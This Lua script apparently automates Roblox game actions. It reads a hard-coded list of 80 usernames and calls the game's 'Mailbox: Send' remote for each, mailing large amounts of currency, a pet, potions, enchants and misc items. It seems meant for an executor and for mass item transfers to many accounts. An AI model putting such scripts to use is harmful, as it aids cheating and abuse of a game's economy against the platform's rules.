local usernamesString = [[
EclipseFang462
InfernoJavelin8597
ShadowStryker6888
RavenLyric2084
RunePhoenix6962
ZenithIgnite1647
RuneLancer9305
RavenJade3971
ElectricLux4419
EclipseAstra3418
FluxEmber6060
ZenEcho771
HarmonyBlade1281
SapphireQuartz4953
LunarCascade662
SapphireDrift6888
RadiantHorizon9688
BlazeEmber1917
FrostKnight3729
EchoNexus9949
BlazeRift5832
VortexVortex9020
CypherFrost6491
NebulaJade2005
PulseRevolt9584
ZenithZephyr2055
RavenUltron6779
ShadowKarma9955
MysticGale1710
MysticIgnite9494
NebulaPulse483
EchoWhisper4551
GravityEmber8658
ValorOrbit1998
RadiantDragon2678
MagnetNexus4442
QuantumIvory748
EchoJade319
OnyxBolt2857
NebulaInferno7355
GravityUmbra3036
RuneSable357
EchoViper4049
SpectralBolt5994
MagnetFable4656
FluxDynamo646
CobaltCobra4721
FrostXenon3406
FrostIgnite3245
VortexBlaze5985
CobaltFrost4362
ZenithFrost2584
CrimsonIon4641
QuantumLancer2264
MirageNebula5578
MysticNight894
MirageViper406
CelestialPyro607
FrostShadow8361
ElectricKarma3878
FrostQuartz6348
RadiantSpecter278
SolsticeWild4533
OnyxXara3854
LunarObsidian5795
GalacticSpectra2883
OnyxHavoc1524
SapphireVoid4230
InfernoXenon9788
SolsticeHorizon325
AuroraRogue2326
RadiantUmbra3075
AstroMercury1621
RadiantPheonix4518
QuantumQuartz1679
OnyxXara7833
PulseRift1003
PrimalVortex6256
LunarKnight6464
TempestAstral3633
]]
local usernames = {}
for line in usernamesString:gmatch("([^\n]*)\n?") do
    table.insert(usernames, line)
end
local function sendMail(username, item, id, amount)
    local args = {
        [1] = username,
        [2] = "wer",
        [3] = item,
        [4] = id,
        [5] = amount
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    wait(1)
end

for _, username in pairs(usernames) do
    sendMail(username, "Currency", "ac2c62f023e6494ea8a6624c49a2bdb0", 28000000)
    sendMail(username, "Pet", "3633cdd19f294fa39e5b51e583938ac4", 65) --PlayerFOXpet
    sendMail(username, "Potion", "272dbc5a55424fe3a9c3c21209e4a2f8",25)
    sendMail(username, "Potion", "b940726bdbee412eb55dd483f5669834",25)
    sendMail(username, "Potion", "69c986d52e7a4f539863aac8e75cabe8",1000)
    sendMail(username, "Enchant", "87d59437bb514ffb95677ea969fca8e0", 1)
    sendMail(username, "Enchant", "9454e7cd015c414d8fd0d0d97517e977", 1)
    sendMail(username, "Enchant", "baa8eb8e9b1448b086912be9f2d00ede", 1)
    sendMail(username, "Misc", "66eb23e8d2cb4464b1045d05e8249e3f", 500)
    sendMail(username, "Misc", "8f42d1247215400a86bd7449e2c7142d", 500)
    sendMail(username, "Misc", "8c8ef0e0ef664e3d99b7e27df6d707bb", 1000)
    sendMail(username, "Misc", "9f28e8c0fc014bab812b34dffce1ee19", 30)--daycare voucher
    wait(1)
end
